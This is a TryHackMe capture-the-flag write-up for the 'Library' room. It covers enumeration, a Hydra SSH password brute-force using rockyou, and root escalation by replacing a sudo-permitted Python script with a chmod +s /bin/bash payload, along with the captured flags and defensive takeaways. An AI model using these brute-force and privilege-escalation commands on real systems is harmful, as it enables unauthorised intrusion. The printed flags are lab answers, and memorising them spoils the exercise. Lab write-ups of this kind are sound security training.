# 📚 Library: Easy

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `library` / `10.114.191.109` |
| **OS** | Ubuntu 16.04 LTS |
| **Attack Surface** | Username harvesting from web source, SSH brute-force |
| **Privesc** | sudo wildcard + home directory control → Python script replacement → SUID bash |

Library exposes a username via blog page source, cracks SSH credentials with a wordlist, then escalates via a poorly scoped `sudo` rule that allows any Python binary to run a script the user controls — replacing `bak.py` with a SUID chmod payload drops a root shell in one step.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -p- -sV -v library -oA tcpscan-library
sudo nmap -sU -v library -oA udpscan-library
```

```
22/tcp open  ssh  OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http Apache httpd 2.4.18
68/udp open|filtered dhcpc  — noise, irrelevant
```

Minimal attack surface: SSH and a web server. No exotic services.

### Directory Bruteforce

```bash
ffuf -u http://library/FUZZ -w ./Web-Content/raft-medium-files.txt -ic -fc 403
```

```
index.html   [200]
robots.txt   [200, Size: 33]
logo.png     [200]
master.css   [200]
```

`robots.txt` came back 33 bytes — short enough to be a hint rather than a real crawl exclusion list.

```bash
curl http://library/robots.txt
```

```
User-agent: rockyou
Disallow: /
```

The `User-agent` field isn't a browser name — it's a wordlist name. The room is explicitly pointing at `rockyou.txt` for credential attacks.

### Web Enumeration — Username Harvest

```bash
curl -sk http://library | grep -i melio
```

```html
<p>Posted on <time datetime="2009-06-29T23:31+01:00">June 29th 2009</time>
by <a href="#">meliodas</a> - <a href="#comments">3 comments</a></p>
```

Blog author `meliodas` leaking straight from the page source. One username — enough to start credential attacks.

---

## 💀 Initial Access — SSH Brute-Force

### Hydra

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -t 4 -v -f library ssh
```

```
[22][ssh] host: library   login: meliodas   password: iloveyou1
```

`iloveyou1` — deep in rockyou. Four threads and about two minutes.

### SSH

```bash
ssh meliodas@library
# password: iloveyou1
```

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
meliodas@ubuntu:~$
```

### User Flag

```bash
cat user.txt
```

```
6d488cbb3f111d135722c33cb635f4ec
```

---

## 🔁 Privilege Escalation — sudo Wildcard + Script Replacement

### sudo -l

```bash
sudo -l
```

```
User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

Two problems with this rule in one line:

1. The glob `/usr/bin/python*` matches every Python binary on the system — `python`, `python2`, `python2.7`, `python3`, `python3.5`, etc. The intent was to lock down a single interpreter; the glob blows that wide open.
2. `bak.py` lives in `/home/meliodas/` — a directory `meliodas` owns and controls. Root owns the file itself, but directory write permission means `meliodas` can delete and recreate it freely.

### Inspecting bak.py

```bash
cat bak.py
```

```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

A routine backup script. Nothing here to hijack directly — but it doesn't matter, because the path is replaceable.

### Replacing bak.py

```bash
rm bak.py
```

```python
#!/usr/bin/env python3

from os import system

cmd = '/bin/chmod +s /bin/bash'
system(cmd)

cmd = 'ls -lah /bin/bash'
system(cmd)
```

### Triggering the sudo Rule

```bash
sudo /usr/bin/python3 /home/meliodas/bak.py
```

```
-rwsr-sr-x 1 root root 1014K Jul 12  2019 /bin/bash
```

`/bin/bash` is now SUID. Drop into a root-privileged shell:

```bash
/bin/bash -p
```

```
bash-4.3# whoami
root
```

### Root Flag

```bash
cat /root/root.txt
```

```
e8c8c6c256c35515d1d344ee0488c617
```

---

## 🗺️ Attack Chain

```
[Web Enumeration]
    curl page source → username: meliodas
          │
          ▼
[SSH Brute-Force]
    hydra + rockyou.txt → meliodas:iloveyou1
          │
          ▼
[SSH Foothold]
    meliodas@library → user.txt
          │
          ▼
[sudo Misconfiguration]
    python* glob + home dir write access
    → rm bak.py → replace with chmod +s payload
    → sudo /usr/bin/python3 /home/meliodas/bak.py
          │
          ▼
[SUID bash → root]
    /bin/bash -p → root.txt
```

---

## 📌 Key Takeaways

- Blog metadata and page source are enumeration targets — a username in an `<a>` tag is as useful as one in a config file
- `sudo` globs (`python*`) are dangerous; they dramatically expand the set of allowed binaries and can break the intent of a scoped rule entirely
- File ownership and directory ownership are separate — a root-owned file inside a user-controlled directory is effectively user-controlled; the user can unlink and recreate it
- Always check what directory a sudoable script lives in, not just who owns the script itself
